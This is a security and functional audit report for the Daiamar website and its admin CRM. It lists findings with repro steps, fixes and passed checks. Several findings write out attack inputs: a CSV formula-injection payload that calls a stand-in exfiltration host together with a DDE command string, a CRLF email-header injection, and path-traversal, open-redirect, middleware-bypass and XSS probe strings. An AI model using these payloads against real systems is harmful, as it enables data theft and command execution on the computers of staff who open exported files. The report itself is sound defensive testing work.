# Daiamar site + admin CRM: functional audit (06.11.2026)

The auditor did not build this site. It was tested against a production build (`NEXT_DIST_DIR=.next-audit next build && next start -p 3120`) with the JSON fallback (`.data/db.json`, seed data). A second build used `NEXT_PUBLIC_GTM_ID=GTM-TEST123` for the consent/GTM checks, and a third instance used an unreachable `DATABASE_URL`. Tools: Playwright (chromium), curl, axe-core 4.10, Lighthouse 12 (mobile), `tsc`, `eslint`, `npm audit`, OpenCV QR decoding, and poppler for the PDFs.

Nothing in `src/` was changed. Afterwards `.data/db.json` was restored from `/tmp/daiamar_db_backup.json` (byte-identical), the test uploads and the `.data/uploads/` folder (which did not exist before) were deleted, the servers were stopped, and `.next-audit` and `.next-audit-gtm` were removed. `next build` had also edited `tsconfig.json` (it added `.next-audit-gtm/types/**/*.ts`) and `next-env.d.ts`. Both were put back (`next-env.d.ts` points to `.next-preview` again), and `tsc --noEmit` passes. Screenshots of problems are in `_shots/audit/`.

## Summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 5 |
| Medium | 9 |
| Low | 24 |
| **Total** | **39** |

---

## Critical

### C1. Next.js 15.5.4 has critical, published advisories, including RCE in the RSC protocol and middleware-bypass bugs
- **Area:** Deployability / security (dependencies)
- **Repro:** `npm audit --omit=dev` reports 7 vulnerabilities (1 critical, 6 high). `next` 15.5.4 matches, among others:
  - GHSA-9qr9-h5gf-34mp "RCE in React flight protocol";
  - GHSA-267c-6grr-h53f and GHSA-26hh-7cqf-hhc6 "Middleware / Proxy bypass in App Router via segment-prefetch routes";
  - GHSA-492v-c6pp-mqqv "Middleware bypass through dynamic route parameter injection";
  - GHSA-2xp9-vwfh-vxw4 "RCE in Image Optimization API when AVIF files are used". `next.config.ts` enables `formats: ["image/avif", ...]`.

  Also flagged: `postcss` (critical, via next), `sharp` (high, libvips/libheif/librsvg), and `zod` (high, via `@vercel/blob` → `@vercel/oidc`).
- **Expected:** No known critical vulnerabilities at launch.
- **Actual:** A version with public RCE and auth-bypass advisories. This matters most here because the whole admin area (pages and `/api/admin/*`) is protected *only* by `src/middleware.ts` (see M4). My simple probes (RSC/prefetch headers, `.segments/*.rsc` paths, `x-middleware-subrequest`) were all redirected or got 401. I did not try to reproduce the advisories in depth.
- **Cause:** `package.json` pins `"next": "15.5.4"`.
- **Fix:** Bump `next` and `eslint-config-next` to the latest 15.5.x patch, re-run `npm audit`, and rebuild.

---

## High

### H1. CSV/Excel exports are open to formula injection, from public form input
- **Area:** Admin / exports / security
- **Repro:**
  1. `POST /api/leads/` with a name of `=HYPERLINK("http://evil.example/?x="&A1,"Click")` and a company of `+SUM(1+1)*cmd|/C calc!A0`.
  2. In admin: Cereri → Excel.
  3. The row in the file is `9278;…;"=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")…";+SUM(1+1)*cmd|/C calc!A0 …`.

  The same `cell()` code is used for the subscribers export (name, company).
- **Expected:** Cells that start with `= + - @ \t \r` are neutralised (for example, prefixed with `'`).
- **Actual:** They are written as is. Excel and LibreOffice will evaluate them when the office opens the export, which allows data exfiltration via HYPERLINK/WEBSERVICE or DDE prompts.
- **Cause:** `src/app/api/admin/export/route.ts:21` and `src/app/api/admin/abonati/route.ts:12` only quote; they do not neutralise formulas.
- **Fix:** In `cell()`, prefix values that match `/^[=+\-@\t\r]/` with `'` before quoting.

### H2. "Unește" (merge duplicates) silently deletes the newer lead's uploaded documents and unlinks its offers
- **Area:** Admin CRM / lead detail / data integrity
- **Repro:**
  1. `POST /api/leads/` name "AUDIT merge older", phone `0746 111 222`.
  2. A second lead, "AUDIT merge newer", phone `0746111222`.
  3. `POST /api/documente/` with phone `0746111222` and file `bilant-2025.pdf`. It is attached to the newest match, #9367.
  4. In `/admin/leads/9366/` → "Posibil duplicat" → Unește → confirm.
- **Expected:** The kept lead (#9366) shows `bilant-2025.pdf`, as the confirm text promises ("Notele, istoricul și câmpurile completate se mută pe ea").
- **Actual:** After the merge, `files` has no row for `bilant-2025.pdf`. The document is gone from admin, and the file is orphaned on disk. On Neon, `files.lead_id … ON DELETE CASCADE` deletes the rows and the Blob objects stay orphaned. Offers of the dropped lead get `lead_id = NULL` (file backend `db-file.ts:85`, Neon `ON DELETE SET NULL`), so they vanish from the lead page.
- **Cause:** `src/lib/leads.ts:38-56` moves activities only, then calls `deleteLead(drop.id)`. Related: `src/lib/db-file.ts:85-87` and `src/lib/db-neon.ts:130`.
- **Fix:** In `mergeLeads`, also re-point `files.lead_id` and `offers.lead_id` from `drop` to `keep` before deleting `drop`. Add `moveFiles`/`moveOffers` to the Backend.

### H3. Document upload sends every file in one request, but Vercel functions cap request bodies at 4.5 MB
- **Area:** Forms / deployability
- **Repro:** Locally, `POST /api/documente/` with 5 × 3 MB PDFs (15 MB in one multipart body) returns 200. The form promises "cel mult 5 fișiere, 10 MB fiecare" (`src/lib/upload.ts`: `MAX_FILE_BYTES = 10 MB`, `MAX_FILES = 5`). `UploadForm.tsx:71` posts all files in one `fetch("/api/documente/")`.
- **Expected:** Uploads within the advertised limits work in production.
- **Actual (inferred for Vercel):** Serverless functions reject request bodies over 4.5 MB with `413 FUNCTION_PAYLOAD_TOO_LARGE`. A single 5 MB scanned PDF, or two phone photos, will fail. The client then shows a generic error, because the 413 body is not the expected JSON.
- **Fix:** Upload straight to Blob from the browser (`@vercel/blob/client` `upload()` with a token route that checks type and size), then post only the keys to `/api/documente/`. Otherwise, lower the limits to under 4.5 MB per request.

### H4. Admin login has no brute-force protection
- **Area:** Security / admin
- **Repro:** 30 wrong-password POSTs to the login server action in under a second return 30 × 303 with no delay, lockout or CAPTCHA.
- **Expected:** Throttling or lockout per IP and globally. One shared password protects financial documents, leads and exports.
- **Actual:** Unlimited guessing.
- **Cause:** `src/app/admin/actions/session.ts:11-27` has no rate limit. `rateLimited()` exists in `src/app/api/request.ts` but is not used here.
- **Fix:** Throttle failed logins (for example, 5 per 15 min per IP, plus an exponential delay). Keep the counter in the DB on Vercel, because in-memory counters are per instance.

### H5. Any timeline entry counts as "first contact", so upload leads never show as "necontactate" and contact-time stats are wrong
- **Area:** Admin CRM (Azi, Panou, weekly summary)
- **Repro:**
  1. `POST /api/documente/` with a new phone. A new lead (kind `documente`, status `nou`) is created.
  2. In the DB, the lead's `firstContactAt` = creation time + 3 ms. The site's own "Documente primite" activity, author "Client", set it.
- **Expected:** First contact = the first call, email or WhatsApp by the team. A brand-new document upload should appear under Azi "necontactate de peste 24 h" and in the weekly "untouched" list.
- **Actual:** `todayLists()` (`src/app/admin/reports.ts:17`) and `weekly.ts:27` filter `!l.firstContactAt`, so these leads never appear there. "Timp până la primul contact" counts them as 0 s.

  The same happens for other non-contact activities:
  - an offer opened online (author "Client");
  - a status change;
  - notes.

  `mergeLeads` already works around this for its merge note.
- **Cause:** `src/lib/db-file.ts:96` and `src/lib/db-neon.ts:348` set `firstContactAt` for every `insertActivity`.
- **Fix:** Update `first_contact_at` only for team-initiated contact types (`apel`, `email`, `whatsapp`, and `nota` only when written by a team member), never for `status`, `documente`, `oferta`, or author "Client".

---

## Medium

### M1. The CTA band overflows at 360 px on 16 pages: headline cut off, buttons stick out of the card
- **Area:** Responsive / UI
- **Repro:** Open `/servicii/` (and every service page, `/zone-deservite/`, `/despre/`, `/echipa/`, `/termeni/`) at 360×800. `scrollWidth` = 368. See `_shots/audit/ctaband_360_overflow.png` and `overflow_360_*.png`.
- **Expected:** No horizontal overflow at 360 (common Android width).
- **Actual:** "Ai nevoie de ajutor? Contactează-ne!" is clipped to "Contactează-n" and the phone/form pills run past the card edge. 390 px and up are fine.
- **Cause:** `noOrphan()` (`src/lib/text.ts`, used in `src/components/ui/CtaBand.tsx:16`) glues "ajutor? Contactează‑ne!" into one unbreakable run. With the `.cta h2 { font-size: 28px }` mobile rule (`src/components/ui/ui.module.css:114`), that run is wider than the 316 px content box.
- **Fix:** Add `min-width: 0` / `overflow-wrap: anywhere` on `.cta > *`, or drop to about 24 px under 380 px. Do not apply `noOrphan` when the last two words are longer than about 14 characters.

### M2. The minimum fill time silently drops real submissions and still fires the conversion
- **Area:** Forms / anti-spam / attribution
- **Repro:** `POST /api/leads/` with `"elapsed":100` (or with no `elapsed`) and valid fields returns `{"ok":true}` 200, and nothing is stored. The client then runs `router.push('/multumim/?tip=…')`, so `generate_lead` and the GTM page-view conversion fire. Same for `/api/documente/` (`Number(null) < 3000`) and `/api/newsletter/` (2 s).
- **Expected:** A human who is fast (autofill on the 2-field "Vă sunăm noi" form, measured from hydration) is never lost. Bots should not be counted as conversions.
- **Actual:** Fast users get a thank-you page and are never called. Ads get a phantom conversion. Bots can bypass the check anyway by sending `elapsed: 5000`.
- **Cause:** `src/app/api/leads/route.ts:21`, `src/app/api/documente/route.ts:50`, `src/app/api/newsletter/route.ts:20`.
- **Fix:** For a short `elapsed`, either store the lead with a `spam_suspect` flag, or return 400 with "Mai încercați o dată" and keep the hard silent-drop only for the honeypot. Measure `elapsed` from the first input event.

### M3. Neon: one failed schema init poisons the instance; the visitor sees a misleading error
- **Area:** Data layer / deployability
- **Repro:** Start with `DATABASE_URL=postgresql://u:p@ep-nonexistent-….neon.tech/neondb`.
  - First `POST /api/leads/`: 500 in 147 ms.
  - Second: 500 in 3 ms. No network call: the rejected promise is cached.
  - The response body is empty (not JSON), so `LeadForm` lands in `catch` and shows "Verificați conexiunea și încercați din nou."
- **Expected:** A transient Neon failure (cold start, network blip) is retried on the next request. The visitor gets a clear "please call" message with the phone numbers.
- **Actual:** `ready ??= …` keeps the rejected promise, so every DB call on that warm instance fails until it is recycled. The error blames the visitor's connection. No lead is silently lost (good), but no fallback is offered.
- **Cause:** `src/lib/db-neon.ts:275`. Also `src/app/api/leads/route.ts` has no try/catch around `insertLead`.
- **Fix:** Reset `ready = null` on rejection. Wrap the inserts in the public routes and return JSON 503 with "Sunați-ne la 0741 021 805". Show that text plus `TrackedLink` phones in the forms.

### M4. Admin pages and `/api/admin/*` rely only on middleware for auth
- **Area:** Security (defence in depth)
- **Repro:** `grep requireSession src/app/api/admin src/app/admin/(panel)/layout.tsx` finds nothing. Export, files, search, the offer PDF and the activity route trust the middleware. Server actions do check (`requireSession`).
- **Expected:** Sensitive handlers check the session themselves, especially with C1's middleware-bypass advisories.
- **Actual:** One middleware bypass exposes every lead, export and uploaded document.
- **Fix:** Call `requireSession()` (or a `401` helper using `verifySessionToken`) at the top of each `/api/admin/*` handler, and in `src/app/admin/(panel)/layout.tsx`.

### M5. A document upload attaches files and a "Client" note to any existing lead whose phone or email is typed in
- **Area:** Forms / security / CRM integrity
- **Repro:** `POST /api/documente/` with `name=Attacker`, `phone=0741222333` (another person's lead, #9278), `message=Vă rog trimiteți oferta la attacker@evil.com` and `contract-semnat.pdf`. Lead #9278's timeline now shows "Mesaj trimis cu documentele: Vă rog trimiteți oferta la attacker@evil.com", author **Client**, and the file appears under its Documente. The submitted name is ignored.
- **Expected:** Uploads from unverified senders do not appear as coming from the known client.
- **Actual:** Anyone who knows a client's phone or email can inject documents and instructions into that client's file. The team trusts "Client" entries.
- **Cause:** `src/app/api/documente/route.ts:34-38` and `:65-79` (`matchLead`, plus the activity with `author: "Client"`). It also loads every lead (`leadsSince(new Date(0))`) on each upload.
- **Fix:** When the name differs from the matched lead, or always: create a new "Documente" lead flagged as a possible duplicate (the existing merge UI handles it), and label the note "Trimis de pe site de «name»", not "Client".

### M6. Consent: GTM loads before any choice, and the attribution cookies and visit beacons ignore a refusal
- **Area:** Consent / GDPR
- **Repro (GTM-TEST123 build, fresh browser):**
  1. Load `/`. Before any click, the browser requests `https://www.googletagmanager.com/gtm.js?id=GTM-TEST123`, and `dm_ft`/`dm_lt` are already set.
  2. Click "Refuz". The cookies stay, and every new visit or click still posts `/api/events/` with UTM/referrer data.
- **Expected (task spec):** "GTM/GA only after consent". The banner and `/cookies/` are consistent with what actually loads.
- **Actual:** Consent Mode v2 "advanced": defaults are denied correctly, but GTM loads and Google tags may send cookieless pings. The banner says the two attribution cookies are "funcționale / mereu active". Marketing attribution is generally not "strictly necessary" under ePrivacy (Romanian Law 506/2004, art. 4(5)). This needs a legal decision.
- **Cause:** `src/components/Analytics.tsx:30-37`, `src/lib/attribution.ts` `captureAttribution()`.
- **Fix:** Either inject the GTM loader only after `dm_consent` ∈ {all, analytics} (basic mode), and gate `dm_ft`/`dm_lt` + `sendEvent("visit")` behind consent, or have the client accept the "advanced" interpretation in writing and document it on `/cookies/`.

### M7. Newsletter confirm and unsubscribe change state on GET, so email link scanners trigger them
- **Area:** Newsletter
- **Repro:** `GET /newsletter/confirmare/?t=<token>` returns 200 and the status becomes `confirmed`. `GET /newsletter/dezabonare/?t=<token>` returns 200 and the status becomes `unsubscribed`. No click or POST is needed.
- **Expected:** Double opt-in proof requires a human action. Unsubscribe should not fire on a pre-fetch.
- **Actual:** Outlook Safe Links, Gmail and corporate scanners pre-fetch links. Addresses get auto-confirmed (which weakens the GDPR proof of consent), or unsubscribed without the person's action.
- **Cause:** `src/app/(site)/newsletter/confirmare/page.tsx:17`, `src/app/(site)/newsletter/dezabonare/page.tsx:17`.
- **Fix:** Render a page with a "Confirm" / "Mă dezabonez" button that posts a server action. Also add `List-Unsubscribe` / `List-Unsubscribe-Post` headers to the emails.

### M8. Deleting a lead leaves its uploaded documents in storage (incomplete erasure)
- **Area:** Admin / GDPR
- **Repro:** The lead with `Factură ăîșț.pdf` → "Șterge cererea" → confirm. The lead and its file rows are gone, but `.data/uploads/d6bc…6ab69.pdf` still exists. Same on Neon: the `files` rows cascade-delete and the Blob objects stay. Also "Șterge datele demo", and the merge in H2.
- **Expected:** Deleting a person's request erases their financial documents.
- **Actual:** Orphaned PII in Blob, with no admin path to find or remove it.
- **Cause:** `src/app/admin/actions/leads.ts` `deleteLead` → `db().deleteLead` never calls `removeFileByKey`. Compare `actions/files.ts`, which does.
- **Fix:** Before deleting the lead, load `db().files(id)` and `removeFileByKey()` each one. Do the same in `deleteDemo`.

### M9. The `/multumim/` conversion fires on every load, not once per submission
- **Area:** Attribution / ads measurement
- **Repro:**
  1. With analytics consent, open `/multumim/?tip=cerere` directly. `generate_lead` is pushed.
  2. Reload or use Back/Forward, and it is pushed again.
  3. DEPLOY.md recommends a GTM **Page View** trigger on `/multumim/`, which fires on every load whatever the consent.
- **Expected:** One conversion per real submission.
- **Actual:** Reloads, bookmarks, shared links and direct visits inflate Google Ads/Meta conversions.
- **Cause:** `src/components/ThanksTracker.tsx:12` (the `useRef` guard is per mount only); DEPLOY.md "Conversii în Google Ads / Meta".
- **Fix:** Have the forms set a one-time `sessionStorage` nonce (or add `&id=<nonce>`) that `ThanksTracker` consumes, and recommend the `generate_lead` custom-event trigger instead of Page View.

---

## Low

### L1. `/api/documente/` returns an empty 500 on malformed attribution JSON
- **Area:** Forms
- **Repro:** POST multipart with `ft={notjson` → `[500]`.
- **Cause:** `src/app/api/documente/route.ts:41` (`JSON.parse` not caught).
- **Fix:** Wrap it in try/catch and treat a bad value as `null`.

### L2. Phone validation only counts digits
- **Area:** Forms
- **Repro:** `phone: "abc123456789xyz"` is accepted and stored.
- **Cause:** `src/lib/lead.ts` (`replace(/\D/g,"").length < 9`).
- **Fix:** Allow only `[\d\s+().-]` and 9–15 digits.

### L3. CR/LF in the name goes into the email subject
- **Area:** Email
- **Repro:** `name: "AUDIT newline\r\nBcc: x@evil.com"` is stored unchanged and used in `subject: "Cerere: <name> (…)"`.
- **Detail:** Not tested live (no Resend key). Resend rejects or normalises newlines in the subject, so the likely effect is a lost notification, logged only to `console.error`.
- **Cause:** `src/app/api/leads/notify.ts`.
- **Fix:** Collapse whitespace (`/\s+/g → " "`) in single-line fields (name, company, phone) at input.

### L4. Long unbroken strings break the admin layout
- **Area:** Admin UI
- **Repro:** A lead name of 120 × "A" makes `/admin/` 2005 px wide at 1440 and 1166 px at 390. `/admin/leads/9278/` is 425 px at 390. See `_shots/audit/admin_overflow_*.png`.
- **Fix:** Add `overflow-wrap: anywhere` on names, emails and messages in the admin CSS.

### L5. Offer PDF: long words overflow into the price columns, and the table header is not repeated
- **Area:** Offers / PDF
- **Repro:** An 18-row offer (5 pages) whose description contains an 80-character word. The word runs across the Cant./Preț/Valoare columns and off the page. Pages 2–5 have no column header.
- **Fix:** Set `wordBreak`/hyphenation on description `Text`, and give the header row `fixed`, or repeat it per page.

### L6. Apex redirect drops the trailing slash and chains; DEPLOY's check would fail
- **Area:** Routing / SEO
- **Repro:**
  - `Host: daiamar.ro`, `GET /servicii/` → `308 https://www.daiamar.ro/servicii` (no slash), then another 308 to `/servicii/`.
  - The DEPLOY.md check "must give `https://www.daiamar.ro/servicii/`" fails if Vercel's domain redirect is not set up.
  - Old WP URLs without a slash take 2 hops (Next's trailing-slash redirect runs first), and DEPLOY says 1. With the apex they take 3 hops.
- **Cause:** `next.config.ts:49`.
- **Fix:** Use `destination: "https://www.daiamar.ro/:path*/"` (or rely on the Vercel domain redirect), and correct DEPLOY.md.

### L7. OG image URLs redirect on every crawler fetch
- **Area:** SEO
- **Repro:** `og:image` = `…/servicii/contabilitate/opengraph-image-t4mubt?95f1…` → 308 to `…-t4mubt/?95f1…=`. Same for the `/resurse/*` OG images.
- **Fix:** Exclude metadata image routes from `trailingSlash` (`skipTrailingSlashRedirect`), or emit the slash form.

### L8. `<html lang="ro">` on `/en/` and `/it/`
- **Area:** SEO / accessibility
- **Detail:** Only an inner `div lang="en"` is set.
- **Cause:** `src/app/layout.tsx:23`.
- **Fix:** Use a separate root layout or route group for EN/IT, or set `lang` from the segment.

### L9. Focus management gaps
- **Area:** Accessibility
- **Detail:**
  - The consent banner is the last element in the DOM: 54 Tab presses on `/cookies/` to reach it, and focus is not moved to it.
  - Esc on the mobile menu sends focus to `<body>`, not back to the toggle (`HeaderMenu.tsx:21`).
  - `LeadForm` tries to focus the first invalid field before React has set `aria-invalid`, so nothing is focused (`LeadForm.tsx:51`; verified: `activeElement.name` is empty).
  - The newsletter errors lack `aria-describedby`.
- **Fix:**
  - Render the banner first in `(site)/layout.tsx`, or focus it on open.
  - Return focus to the toggle on close.
  - Focus the first key from `found` with `document.getElementById` after the state update.

### L10. Tap targets under 40 px on mobile
- **Area:** Responsive / UI
- **Repro (390):**
  - footer and contact links, 22–30 px high;
  - the EN/IT switch, 26×25 / 32×25;
  - the breadcrumb "Acasă", 40×22;
  - "Setări cookie-uri", 118×24;
  - the "Vezi și" FAQ links, 312×23;
  - the "Deschide în Google Maps" and Waze links, 24 px.
- **Fix:** Use `min-height: 44px` / extra padding on standalone links in the footer, contact cards and lang switch.

### L11. Admin warn chip contrast is 4.42:1
- **Area:** Accessibility (admin)
- **Detail:** axe-core: `#b4532a` on `#fbefe9`, under 4.5:1 for small text, on `/admin/leads/` (16 nodes) and `/admin/pipeline/`. All public pages pass axe (WCAG 2.1 AA).
- **Cause:** `src/app/admin/admin.module.css:143`.
- **Fix:** Darken `--warn` slightly (for example `#a24a25`).

### L12. CSP Report-Only collects no reports, and `frame-src` will break the admin PDF preview
- **Area:** Security headers
- **Detail:** There is no `report-uri`/`report-to`, so violations appear only in the browser console. `frame-src` lacks `'self'`: every `/admin/oferte/<id>/` load logs 5 violations for the `/api/admin/offers/<id>/pdf/` iframe, which will break once the header is enforced.
- **Cause:** `next.config.ts:12`.
- **Fix:** Add `'self'` to `frame-src` and a `report-to` endpoint before switching to an enforced header.

### L13. Some missing records return the wrong status or metadata
- **Area:** Routing
- **Detail:**
  - `/admin/leads/999999/` returns 200 (streamed, because of `(panel)/loading.tsx`).
  - `/servicii/nu-exista/` returns 404 but renders the default title and `robots: index, follow` in the browser.
- **Fix:** Check existence before streaming (move `loading.tsx` lower), and give `not-found` explicit metadata.

### L14. Rate limits and event counts can be gamed
- **Area:** Anti-spam / analytics
- **Detail:**
  - The rate-limit key is the first `X-Forwarded-For` value (`request.ts:6`), so it can be spoofed outside Vercel.
  - The limiter is in memory per instance (documented).
  - `/api/events/` accepts any valid `kind` from anyone (60/min/IP), and headless bots (HeadlessChrome) are counted as visits, which inflates the Panou funnel.
- **Fix:** On Vercel use `x-real-ip`/`request.ip`, filter bot user agents on visit, and require same-origin `Origin` on events.

### L15. Public POST APIs accept cross-origin requests
- **Area:** Security
- **Repro:** `Origin: https://evil.example`, `content-type: text/plain`, JSON body → `/api/leads/` 200 and the lead is created. Multipart cross-origin → `/api/documente/` 200. Any site can make visitors' browsers submit leads or uploads (spam, junk files). Server actions are protected (a cross-origin login returns 500).
- **Fix:** Reject a non-matching `Origin`/`Sec-Fetch-Site` on `/api/leads`, `/api/documente`, `/api/newsletter` and `/api/events`.

### L16. Logout does not revoke the session token
- **Area:** Admin auth
- **Repro:** Log out, then reuse the old `dm_admin` cookie: `/api/admin/export/` returns 200. Tokens stay valid for 14 days. The only revocation is rotating `ADMIN_SECRET` (which logs everyone out). Expiry itself works (an expired signed token returns 401).
- **Fix:** Add a server-side `session_version` setting included in the HMAC, and bump it on "Ieșire de pe toate dispozitivele".

### L17. Money inputs round silently
- **Area:** Admin / values
- **Detail:**
  - `"2500,6"` is saved as 2501 although the hint says "fără zecimale".
  - In the offer builder `numberOrNull`, `"0.125"` becomes 125 (the `.` is treated as a thousands separator).
- **Fix:** Reject decimals where whole lei are expected, and only strip `.` when it is followed by exactly 3 digits and then the end or a comma.

### L18. `dm_author` is not httpOnly, contrary to the README
- **Area:** Admin
- **Cause:** `src/app/admin/actions/session.ts:38`.
- **Fix:** Add `httpOnly: true` (the activity route reads it server-side anyway).

### L19. Newsletter edge cases
- **Area:** Newsletter
- **Detail:**
  - Re-submitting a *pending* address overwrites its name and company and rotates the token, so the earlier confirmation link stops working.
  - The bot and already-confirmed paths return `emailed: true` even without Resend, so `/multumim/` says "Deschideți e-mailul" when nothing was sent.
- **Fix:** Keep the existing token while pending, don't overwrite non-empty fields, and return the real `canSendEmail()`.

### L20. Newsletter tokens reach GA when GTM is configured
- **Area:** Privacy
- **Detail:** `/newsletter/confirmare/?t=…` and `/dezabonare/?t=…` are not excluded from GTM (only `/admin` and `/oferta` are), so `page_location` would send the unsubscribe token to Google.
- **Fix:** Exclude `/newsletter/` in `Analytics.tsx`, or strip `t` with `history.replaceState` before GTM loads.

### L21. JSON fallback can lose or wipe data across processes
- **Area:** Data layer (local only)
- **Detail:**
  - The write queue is per process (20 parallel submissions in one process: 20 stored, no duplicate IDs).
  - Roland's preview on :3200 and any test server share `.data/db.json`.
  - `writeFile` is not atomic, and `load()` turns a parse error into an *empty* dataset (`db-file.ts:45`). A mutate that reads a half-written file would write back an almost empty DB.
- **Fix:** Write to a temp file and `rename`, and throw (don't return empty) on parse errors.

### L22. Uploads on Vercel without Blob fail with an opaque 500
- **Area:** Deployability
- **Detail:** `storeFile` falls back to `.data/uploads` (EROFS on Vercel). There is no explicit guard like `db.ts` has for `DATABASE_URL`.
- **Cause:** `src/lib/storage.ts:24`.
- **Fix:** Throw a clear "Connect Vercel Blob" error when `process.env.VERCEL` is set without the token, and return JSON 503 to the form.

### L23. Neon details
- **Area:** Data layer
- **Detail:**
  - The ~15 schema statements run sequentially on every cold start before the first query, which adds latency to public form submits.
  - `updateLead`/`updateOffer` are read-merge-write without a transaction (lost updates when two people edit the same lead).
  - `nextOfferNumber` can race into a `UNIQUE` violation (500).
  - Migrations are idempotent (`IF NOT EXISTS`) and all queries are parameterised tagged templates. No SQL injection found.
- **Fix:** Gate migrations behind a `schema_version` setting, and use partial `UPDATE … SET col = COALESCE(…)` or a transaction.

### L24. Content and minor UX issues
- **Area:** Content / UX
- **Detail:**
  - `register="tu"` on `/firme-noi/` changes only the email hint. The service label, consent text and button stay in the formal style (mixed register).
  - The weekly summary says "1 clienți câștigați".
  - The descriptions of `/confidentialitate/` (171 chars) and `/termeni/` (187) exceed 160.
  - The phones and email on the public offer page are plain `<a>`, not `TrackedLink`.
  - The project `.gitignore` relies on the parent repo for `.env.production` / `.env.development`.
  - Lighthouse mobile `/` performance is 88 (LCP 3.8 s on the stock hero image; render-blocking CSS ~370 ms). `/contact/` is 96.
- **Fix:** Pass `register` through all LeadForm strings, pluralise, trim the descriptions, and add `.env*` to the project `.gitignore`.

---

## Passed (tested and OK)

**Pages and routing**
- [x] All 23 sitemap URLs, plus the 3 landings, `/multumim/` (all 4 `tip`), `/trimite-documente/`, the newsletter pages, the 3 articles, `/en/`, `/it/`: 200, exactly one H1.
- [x] No console errors and no failed requests at 1440 and 390, other than the intended 404s.
- [x] All internal links resolve (30 unique), no broken `#` anchors, `#formular` exists on `/contact/`, no broken images.
- [x] 404s for unknown pages, services, articles and offer tokens; `/wp-content/uploads/…` returns 404 as intended.
- [x] The 6 old WP URLs redirect (308) to the right new pages, with and without a slash; `/en`, `/it` keep their paths.
- [x] The apex host (and `DAIAMAR.RO`, `daiamar.ro:443`) redirects to www; the www host is served.
- [x] `robots.txt` (disallows private paths; AI crawlers allowed), `llms.txt`, `llms-full.txt` (26 KB) and the OG images (PNG 1200×630) work.

**Responsive and UI**
- [x] No horizontal overflow at 1440, 1024, 768 or 390 on any public page (360 failures: see M1).
- [x] The consent banner does not overlap the mobile bar or floating WhatsApp at any width; the footer stays reachable above the bar.
- [x] Mobile menu: opens, locks scroll, Tab goes into the panel, Esc closes, a route change closes it and restores scroll.
- [x] The FAQ `details` opens with the keyboard (Enter); the sticky header stays at top 0 when scrolled.
- [x] No 1–2-word H1/H2 orphans detected.

**Forms**
- [x] Validation: empty fields, name only, a bad email, missing consent, `consent:"true"` (string), an unknown service, a whitespace-only name, a non-string name, a non-JSON body.
- [x] Phone without email accepted; email without phone accepted (compact form).
- [x] Unicode and diacritics stored correctly; 50 KB name and message clipped to 120/2000; a 5 MB JSON body handled.
- [x] Every form redirects to `/multumim/?tip=cerere|apel|documente|newsletter&f=<placement>`; the leads appear in admin with the right kind, placement, service preset and page.
- [x] Double-click submit creates one lead.
- [x] Rate limits: leads 5/10 min → 429, uploads 3/10 min → 429, with a user-visible error.
- [x] The honeypot drops the submission.
- [x] Upload: a renamed EXE and an HTML file rejected by magic bytes; an 11 MB file rejected on client and server; 6 files rejected; zero files rejected.
- [x] Upload: a `../../etc/passwd".pdf` filename stored as a display name only (random 64-hex key on disk); downloads are `attachment`, `nosniff`, `private, no-store`.
- [x] File routes reject non-numeric, negative and traversal IDs (404).

**XSS**
- [x] `<script>`, `<img onerror>`, `<svg onload>` and a `javascript:` referrer in every field render as text in admin (lead page, list, search, pipeline, Azi). No dialog fired.

**Attribution**
- [x] Google Ads (`gclid`), Meta paid (`utm_medium=paid`), `fbclid` → FB/IG organic, ONRC flyer, LinkedIn, Google organic referrer, chatgpt.com → AI, Direct: all classified correctly.
- [x] Last touch survives internal navigation; first touch is kept when a later visit comes from another source (lead channel = last touch, `ft` = Google Ads).
- [x] Phone, email, WhatsApp and maps clicks are logged as events with placement and channel.
- [x] No visit events from `/admin/`, `/admin/login/` or `/oferta/…`.

**Consent**
- [x] The banner shows on the first visit.
- [x] Refuz / Accept / Setări set `dm_consent`; the choice persists after reload.
- [x] The footer "Setări cookie-uri" reopens the banner with the current state.
- [x] Consent Mode defaults are all denied; updates are pushed on change.
- [x] `generate_lead` is pushed only with analytics consent.
- [x] No GTM on admin or oferta; `/cookies/` lists `dm_ft`, `dm_lt`, `dm_consent`, `_ga`.

**Admin**
- [x] Unauthenticated: all `/api/admin/*` return 401, all admin pages redirect to login with `next`.
- [x] Tampered, unsigned and expired cookies are rejected.
- [x] `?next=` open-redirect attempts (`https://evil.com`, `//evil.com`, `javascript:`) fall back to `/admin/`.
- [x] Case and encoding variants are not bypasses.
- [x] Team names, notification emails (invalid ones rejected), and the weekly test without Resend (shows the text).
- [x] The lost reason is enforced server-side, even with `required` removed.
- [x] Notes, activities (empty activity blocked), values, assignee, follow-ups (overdue shows in Azi), and quick actions (logged).
- [x] `/` search shortcut and search by phone; leads filters by status, channel, service, assignee and text.
- [x] Pipeline: drag and drop, the lost dialog with Esc cancel, the keyboard-focusable select (visible on focus), and the mobile select.
- [x] Manual add; file delete (row and disk); "Șterge datele demo" (removes only demo rows; Panou still loads).
- [x] Every admin page at 390: no overflow except with very long strings (L4).

**Links, QR and budget**
- [x] Links + QR: UTM values are slugified; the downloaded PNG (1200×1200) decodes to exactly the shown URL; the SVG downloads.
- [x] Buget/ROI, Google Ads checked by hand: spend 5.100 lei, 12 leads, 2 clients → 425 lei/lead, 2.550 lei/client, won 1.300 lei/month, 1.300×12/5.100 = 3,1× (matches).

**Offers**
- [x] Totals checked by hand:
  - Plus TVA 21%, 10% discount (1.000 lei/month + 2 × 1.500 lei one-off): 900 / 2.700 net, VAT 756, total 1.089 / 3.267.
  - TVA inclus: 743,80 / 2.231,40 net, VAT 624,80.
  - Fără TVA: 900 / 2.700.
  - 18-row offer: 7.537,50 + 21% = 9.120,38.
- [x] Add and remove rows keep the other rows' values.
- [x] PDF: diacritics correct (Inter Tight embedded, Identity-H); the 18-row offer paginates to 5 pages; fonts and logo are traced into the PDF routes' NFT files (Vercel).
- [x] Sending without Resend shows the fallback; mailto and WhatsApp links are correct.
- [x] Online offer: draft returns 404 publicly (page and PDF); admin and WhatsApp-preview views are not counted; anonymous views count and set the status to "Văzută".
- [x] Accept: the lead becomes Client with net values and `wonAt`; a second accept is idempotent; expired and refused offers cannot be accepted, even with token swapping; a random token returns 404.

**Security, data and deployability**
- [x] Security headers present: HSTS preload, nosniff, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, CSP Report-Only; no `X-Powered-By`.
- [x] No secrets or env names in `.next-audit/static`.
- [x] `.gitignore` covers `.env*.local`, `.data/`, uploads; no IP stored anywhere.
- [x] Cron: no or wrong secret → 401; the right secret → 200 with "skipped (no Resend)" and the summary text; `vercel.json` path and schedule valid.
